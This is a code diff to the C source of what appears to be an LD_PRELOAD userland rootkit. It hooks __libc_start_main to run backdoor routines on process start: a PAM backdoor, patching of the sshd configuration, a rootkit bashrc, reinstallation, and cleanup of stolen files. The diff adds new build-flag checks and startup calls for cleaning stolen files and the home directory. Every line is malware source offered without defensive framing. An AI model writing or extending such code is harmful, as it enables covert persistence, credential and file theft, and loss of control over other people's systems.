@@ -3,14 +3,20 @@
 #include "config.h"
 
 #if !defined USE_PAM_BD && defined PATCH_SSHD_CONFIG
-#error "USE_PAM_BD is not defined while PATCH_SSHD_CONFIG is."
+#error "USE_PAM_BD is not defined while PATCH_SSHD_CONFIG is"
 #endif
 #if defined USE_PAM_BD && !defined PATCH_SSHD_CONFIG
-#warning "USE_PAM_BD is enabled without PATCH_SSHD_CONFIG."
+#warning "USE_PAM_BD is enabled without PATCH_SSHD_CONFIG"
+#endif
+#if defined ROOTKIT_BASHRC && !defined USE_PAM_BD
+#error "USE_PAM_BD is not defined while ROOTKIT_BASHRC is"
+#endif
+#if !defined ROOTKIT_BASHRC && defined USE_PAM_BD
+#warning "USE_PAM_BD is enabled without ROOTKIT_BASHRC"
 #endif
 
 #if defined READ_GID_FROM_FILE  && !defined BACKDOOR_UTIL
-#warning "GID changing is not safely possible without BACKDOOR_UTIL defined."
+#warning "GID changing is not safely possible without BACKDOOR_UTIL defined"
 #endif
 
 #if !defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
@@ -76,9 +82,15 @@ typedef struct {
 
 
 int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
-    if(not_user(0))
+    if(not_user(0) || rknomore())
         goto do_libc_start_main;
 
+#if defined FILE_CLEANSE_TIMER && defined FILE_STEAL && defined CLEAN_STOLEN_FILES
+    cleanstolen();
+#endif
+#ifdef CLEANSE_HOMEDIR
+    bdvcleanse();
+#endif
 #ifdef ROOTKIT_BASHRC
     checkbashrc();
 #endif
@@ -88,7 +100,7 @@ int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_
 #ifdef DO_REINSTALL
     reinstall();
 #endif
-#if defined USE_PAM_BD && defined PATCH_SSHD_CONFIG
+#ifdef PATCH_SSHD_CONFIG
     sshdpatch(REG_USR);
 #endif
 
